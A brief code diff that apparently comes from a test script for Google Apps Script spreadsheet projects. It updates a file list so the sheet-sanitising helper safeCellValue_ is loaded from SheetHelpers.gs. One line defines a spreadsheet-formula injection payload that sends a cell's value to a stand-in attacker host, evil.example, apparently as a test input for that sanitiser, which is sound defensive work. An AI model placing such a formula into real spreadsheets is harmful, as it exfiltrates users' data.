@@ -20,7 +20,7 @@ const FILES = ['Config.gs', 'SheetHelpers.gs', 'ForumTopicManager.gs', 'ShopRout
   'CustomerChat.gs', 'Router.gs', 'FunnelLog.gs', 'PartnerSelfRegister.gs'];
 // 営業ボード（v7-operations・別の GAS プロジェクト）は v7 のシートを読み戻して書く
 const OPS = path.join(__dirname, '..', 'v7-operations');
-const OPS_FILES = ['FieldExpense.gs', 'ScoutBoard.gs'];
+const OPS_FILES = ['SheetHelpers.gs', 'ScoutBoard.gs'];   // safeCellValue_ は SheetHelpers.gs（2026-10-27 共通化）
 
 const EVIL = '=IMPORTDATA("https://evil.example/?"&A1)';
 
